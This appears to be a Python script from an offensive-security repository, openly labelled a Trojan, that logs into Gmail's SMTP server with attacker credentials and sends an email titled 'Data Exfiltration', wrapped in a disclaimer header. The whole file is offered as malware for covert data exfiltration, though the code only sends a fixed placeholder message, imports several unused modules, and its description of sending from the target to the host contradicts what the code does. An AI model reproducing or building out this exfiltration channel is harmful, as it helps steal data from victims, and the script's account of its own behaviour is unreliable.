#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 7th 2024
# Important Note:
#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
# these scripts. They are malicious and should only be used in professionally approved White Hat 
# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
# and if that repository is public, all the extracted data will be available for the whole world to see.
# Description of Script
# This script, is designed to automate the process of sending emails from a target email address to a 
# host email address in a covert manner. The script utilizes the smtplib library to establish a connection
# to the SMTP server and send emails. The user needs to specify the SMTP server details, such as the 
# server address and port, as well as the target email address, host email address, and the host 
# email's password. Once the necessary details are provided, the script automatically sends an 
# email from the target email address to the specified host email address without any user 
# interaction. This script can be used for various purposes, including data exfiltration, 
# communication in covert operations, or as a part of a malicious attack. To use the script
# , simply modify the necessary variables such as the SMTP server details, target email address,
# host email address, and password, and then run the script.
#################################################################################################
import smtplib
import imaplib
import time
import ftplib
import os
import win32com.client  # Only for Windows environment

# Global variables
smtp_server = "smtp.gmail.com"
smtp_port = 587
smtp_acct = "your_email@gmail.com"  # Change to the attacker's email
smtp_passwd = "your_password"       # Change to the attacker's email password
tgt_accts = ["target_email@example.com"]  # Change to the target's email

# Function to send plain text email
def plain_email(subject, contents, target_emails):
    """
    Sends a plain text email.

    Args:
    subject (str): The subject of the email.
    contents (str): The body of the email.
    target_emails (list): List of target email addresses.
    """
    # Construct the email message
    message = f'Subject: {subject}\nFrom: {smtp_acct}\n'
    message += f'To: {", ".join(target_emails)}\n\n{contents}'
    
    # Connect to SMTP server and send the email
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_acct, smtp_passwd)
    server.sendmail(smtp_acct, target_emails, message)
    
    # Sleep briefly before quitting the server
    time.sleep(1)
    server.quit()

# Trojan Functionality
def trojan():
    # Automatically send emails from the target address to the host address
    # Modify the contents as needed
    subject = "Data Exfiltration"
    contents = "Confidential data exfiltrated from the target."
    plain_email(subject, contents, tgt_accts)

if __name__ == '__main__':
    # Call the Trojan function to execute malicious activities
    trojan()
